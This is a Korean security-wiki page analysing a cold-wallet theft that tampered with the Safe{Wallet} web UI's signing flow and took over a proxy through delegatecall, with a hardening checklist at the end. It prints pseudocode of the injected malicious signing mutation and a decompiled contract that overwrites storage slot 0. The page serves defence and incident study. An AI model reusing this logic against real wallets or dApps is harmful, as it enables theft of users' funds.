# Web3 서명 워크플로우 탈취 & Safe Delegatecall Proxy Takeover

{{#include ../../banners/hacktricks-training.md}}

## 개요

콜드 월렛 도난 체인은 **Safe{Wallet} web UI의 공급망 침해(supply-chain compromise)**와 **프록시의 구현 포인터(slot 0)를 덮어쓴 온체인 delegatecall 원시(primitive)**을 결합했습니다. 주요 요점은 다음과 같습니다:

- dApp이 서명 경로에 코드를 주입할 수 있다면, 서명자를 공격자가 선택한 필드에 대해 유효한 **EIP-712 signature**를 생성하게 하면서 원래 UI 데이터를 복원해 다른 서명자들이 눈치채지 못하게 할 수 있습니다.
- Safe proxies는 `masterCopy`(implementation)를 **storage slot 0**에 저장합니다. slot 0에 쓰는 컨트랙트로의 delegatecall은 사실상 Safe를 공격자 로직으로 “업그레이드”하여 지갑에 대한 완전한 제어를 제공합니다.

## Off-chain: Targeted signing mutation in Safe{Wallet}

변조된 Safe 번들 (`_app-*.js`)은 특정 Safe 및 signer 주소를 선택적으로 공격했습니다. 삽입된 로직은 서명 호출 직전에 실행되었습니다:
```javascript
// Pseudocode of the malicious flow
orig = structuredClone(tx.data);
if (isVictimSafe && isVictimSigner && tx.data.operation === 0) {
tx.data.to = attackerContract;
tx.data.data = "0xa9059cbb...";      // ERC-20 transfer selector
tx.data.operation = 1;                 // delegatecall
tx.data.value = 0;
tx.data.safeTxGas = 45746;
const sig = await sdk.signTransaction(tx, safeVersion);
sig.data = orig;                       // restore original before submission
tx.data = orig;
return sig;
}
```
### Attack properties
- **Context-gated**: 피해자 Safe/서명자에 대해 하드코드된 허용 목록이 잡음을 줄이고 탐지 가능성을 낮췄다.
- **Last-moment mutation**: 필드 (`to`, `data`, `operation`, gas)가 `signTransaction` 직전에 덮어써졌다가 되돌려졌기 때문에 UI에 표시된 제안 페이로드는 정상처럼 보였지만 서명은 공격자 페이로드와 일치했다.
- **EIP-712 opacity**: 지갑은 구조화된 데이터를 표시했지만 중첩된 calldata를 디코드하거나 `operation = delegatecall`을 강조하지 않아 변형된 메시지가 사실상 블라인드 서명되었다.

### Gateway validation relevance
Safe 제안은 **Safe Client Gateway**에 제출된다. 강화된 검사 이전에는 UI가 서명 후 필드를 다시 쓰면 `safeTxHash`/서명이 JSON 본문과 다른 필드를 가리키는 제안을 게이트웨이가 수락할 수 있었다. 사건 이후 게이트웨이는 해시/서명이 제출된 트랜잭션과 일치하지 않는 제안을 거부한다. 유사한 서버측 해시 검증은 모든 signing-orchestration API에 적용되어야 한다.

## On-chain: Delegatecall proxy takeover via slot collision

Safe 프록시는 `masterCopy`를 **storage slot 0**에 보관하고 모든 로직을 해당 컨트랙트로 위임한다. Safe가 **`operation = 1` (delegatecall)**을 지원하기 때문에, 서명된 어떤 트랜잭션도 임의의 컨트랙트를 가리켜 프록시의 스토리지 컨텍스트에서 그 코드가 실행되게 할 수 있다.

공격자 컨트랙트는 ERC-20 `transfer(address,uint256)`을 모방했지만 대신 `_to`를 slot 0에 썼다:
```solidity
// Decompiler view (storage slot 0 write)
uint256 stor0; // slot 0
function transfer(address _to, uint256 _value) external {
stor0 = uint256(uint160(_to));
}
```
실행 경로:
1. 피해자들이 `execTransaction`에 `operation = delegatecall`, `to = attackerContract`, `data = transfer(newImpl, 0)`로 서명함.
2. Safe masterCopy가 이러한 파라미터에 대한 서명을 검증함.
3. Proxy가 `attackerContract`로 delegatecall을 수행함; `transfer` 본문이 slot 0을 기록함.
4. Slot 0 (`masterCopy`)이 이제 공격자 제어 로직을 가리켜 → **지갑 완전 장악 및 자금 탈취**.

## Detection & hardening checklist

- **UI integrity**: JS assets / SRI 고정(pin); 번들 차이 모니터링; 서명 UI를 신뢰 경계의 일부로 취급.
- **Sign-time validation**: 하드웨어 지갑에서 **EIP-712 clear-signing** 사용; `operation`을 명시적으로 렌더링하고 중첩된 calldata를 디코드. 정책이 허용하지 않는 한 `operation = 1`인 경우 서명 거부.
- **Server-side hash checks**: 제안을 중계하는 gateways/services는 `safeTxHash`를 재계산하고 서명이 제출된 필드와 일치하는지 검증해야 함.
- **Policy/allowlists**: `to`, selectors, 자산 유형에 대한 사전 검사 규칙을 마련하고 검증된 흐름을 제외하고 delegatecall을 금지. 완전 서명된 트랜잭션을 브로드캐스트하기 전에 내부 정책 서비스를 요구.
- **Contract design**: 불필요하지 않는 한 multisig/treasury 지갑에서 임의의 delegatecall 노출을 피할 것. 업그레이드 포인터를 slot 0에서 떨어진 곳에 두거나 명시적 업그레이드 로직과 접근 제어로 보호.
- **Monitoring**: treasury 자금을 보유한 지갑에서의 delegatecall 실행과 일반적인 `call` 패턴에서 `operation`을 변경하는 제안에 대해 경보.

## References

- [In-depth technical analysis of the Bybit hack (NCC Group)](https://www.nccgroup.com/research-blog/in-depth-technical-analysis-of-the-bybit-hack/)
- [EIP-712](https://eips.ethereum.org/EIPS/eip-712)
- [safe-client-gateway (GitHub)](https://github.com/safe-global/safe-client-gateway)

{{#include ../../banners/hacktricks-training.md}}
